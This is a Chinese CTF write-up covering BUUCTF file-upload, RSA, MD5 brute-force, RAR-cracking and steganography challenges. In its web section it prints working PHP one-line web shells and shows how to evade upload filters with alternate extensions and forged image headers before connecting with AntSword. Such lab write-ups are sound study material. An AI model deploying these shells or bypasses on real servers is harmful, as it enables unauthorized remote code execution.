# BUUCTF-php后缀名

第六周  4月4日

**目录**

[TOC]



## WEB

### [极客大挑战 2019]Upload

打开环境 文件上传

一句话木马

```php
<?php @eval($_POST['a']);?>
```

尝试注入

<img src="https://i-blog.csdnimg.cn/blog_migrate/bbd909bc2f8be6615dc0d2b9e7f78355.png" alt="" style="max-height:544px; box-sizing:content-box;" />


返回需要图片 我们更改后缀名



<img src="https://i-blog.csdnimg.cn/blog_migrate/d0e6dec8c7d56620374ebd9fa6a20109.png" alt="" style="max-height:394px; box-sizing:content-box;" />




发现了 文件内容  看看是不是过滤了php语言

```cobol
<script language='php'>eval($_POST['a']);</script>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d534245fe986a09666912c1a190052b9.png" alt="" style="max-height:597px; box-sizing:content-box;" />


说明 是不是 文件头的检测



<img src="https://i-blog.csdnimg.cn/blog_migrate/6c64fe9c1cc12166d6fd6533f5031079.png" alt="" style="max-height:688px; box-sizing:content-box;" />


上传成功 我们需要php文件 所以抓包改后缀

<img src="https://i-blog.csdnimg.cn/blog_migrate/d6326a1755d8f9eb3c2721ad851fb36a.png" alt="" style="max-height:584px; box-sizing:content-box;" />


发现php 不可以 我们进行替代 绕过后缀检测 进行 尝试

```cobol
php,php3,php4,php5,phtml.pht
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a2222d6774fbaa747b1476f6ad44aa14.png" alt="" style="max-height:659px; box-sizing:content-box;" />




尝试蚁剑链接 我们猜测

```cobol
URL/upload/1.phtml
```

所以进行链接



<img src="https://i-blog.csdnimg.cn/blog_migrate/abc51417ffdae2845ac2bc9fa22b81fa.png" alt="" style="max-height:699px; box-sizing:content-box;" />


得到flag

### [ACTF2020 新生赛]Upload



<img src="https://i-blog.csdnimg.cn/blog_migrate/56b6c674ccfa596626942491d33ad0ea.png" alt="" style="max-height:478px; box-sizing:content-box;" />


文件上传



<img src="https://i-blog.csdnimg.cn/blog_migrate/9139b3ea5dd5c5943a95924f640fa7b5.png" alt="" style="max-height:353px; box-sizing:content-box;" />


使用 jpg的文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/202268ba7f762cd589ebfaa5ca6cf141.png" alt="" style="max-height:633px; box-sizing:content-box;" />


上传成功 我们需要用php执行 抓包改后缀

改php失败

<img src="https://i-blog.csdnimg.cn/blog_migrate/2bde4106d550456d5bb5c3b64b8a4417.png" alt="" style="max-height:166px; box-sizing:content-box;" />




改为phtml试试看



<img src="https://i-blog.csdnimg.cn/blog_migrate/3610cd826be2c0f248167807d2674ac5.png" alt="" style="max-height:151px; box-sizing:content-box;" />


成功 进行链接



<img src="https://i-blog.csdnimg.cn/blog_migrate/b0ff67d1386d0916f887c2ac5377d01e.png" alt="" style="max-height:699px; box-sizing:content-box;" />


得到flag

## Crypto

### RSA

rsa密码 我们选择用脚本来破解

py脚本

```cobol
import gmpy2
p =gmpy2.mpz(473398607161)
q =gmpy2.mpz(4511491)
e =gmpy2.mpz(17)
phi_n= (p - 1) * (q - 1)
d = gmpy2.invert(e, phi_n)
print("d is:")
print (d)
```

```cobol
d is:
125631357777427553
```

得到flag

### 丢失的MD5

```cobol
import hashlib
for i in range(32,127):
    for j in range(32,127):
        for k in range(32,127):
            m=hashlib.md5()
            m.update('TASC'+chr(i)+'O3RJMV'+chr(j)+'WDJKX'+chr(k)+'ZM')
            des=m.hexdigest()
            if 'e9032' in des and 'da' in des and '911513' in des:
                print des
 
 
```

print函数错误

```cobol
import hashlib
for i in range(32,127):
    for j in range(32,127):
        for k in range(32,127):
            m=hashlib.md5()
            m.update('TASC'+chr(i)+'O3RJMV'+chr(j)+'WDJKX'+chr(k)+'ZM')
            des=m.hexdigest()
            if 'e9032' in des and 'da' in des and '911513' in des:
                print(des)
 
 
```

运行 然后报错

```vbnet
Unicode-objects must be encoded before hashing
Unicode对象必须在哈希之前进行编码
```

我们对updata的内容进行 字符串编码

```scss
import hashlib
for i in range(32,127):
    for j in range(32,127):
        for k in range(32,127):
            m=hashlib.md5()
            m.update('TASC'.encode('utf-8')+chr(i).encode('utf-8')+'O3RJMV'.encode('utf-8')+chr(j).encode('utf-8')+'WDJKX'.encode('utf-8')+chr(k).encode('utf-8')+'ZM'.encode('utf-8'))
            des=m.hexdigest()
            if 'e9032' in des and 'da' in des and '911513' in des:
                print(des)
 
 
```

进行utf-8编码

然后运行得到flag

```cobol
e9032994dabac08080091151380478a2
```

## Misc

### rar



<img src="https://i-blog.csdnimg.cn/blog_migrate/6cc8a954611d46d761958d2aa59e10a3.png" alt="" style="max-height:146px; box-sizing:content-box;" />


很明显就是让我们进行暴力破解



<img src="https://i-blog.csdnimg.cn/blog_migrate/9a4308575a47261ca97fba85460f02f6.png" alt="" style="max-height:455px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/a50f91b3404dde31ecdf0cad2282d199.png" alt="" style="max-height:455px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/944c20dd27958c9c7a7a0b20569cea40.png" alt="" style="max-height:195px; box-sizing:content-box;" />


得到密码

### qr

得到二维码 扫描即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/c039ff62c647feff0ed04ecbbf2c2b20.png" alt="" style="max-height:665px; box-sizing:content-box;" />


### 镜子里面的世界

打开文件 放入strgsolve

红0 上面发现有东西



<img src="https://i-blog.csdnimg.cn/blog_migrate/9f7c3812359950cf5f6167aa5633a15c.png" alt="" style="max-height:723px; box-sizing:content-box;" />


绿0



<img src="https://i-blog.csdnimg.cn/blog_migrate/fa516312cdd24df104e209fd80f40673.png" alt="" style="max-height:723px; box-sizing:content-box;" />


蓝也一样 我们进行提取



<img src="https://i-blog.csdnimg.cn/blog_migrate/9e09c3b4653a939af49e7d3cf54f479a.png" alt="" style="max-height:568px; box-sizing:content-box;" />


保存text



<img src="https://i-blog.csdnimg.cn/blog_migrate/16b1de18bb02d046e44044cb75b1175a.png" alt="" style="max-height:781px; box-sizing:content-box;" />


得到flag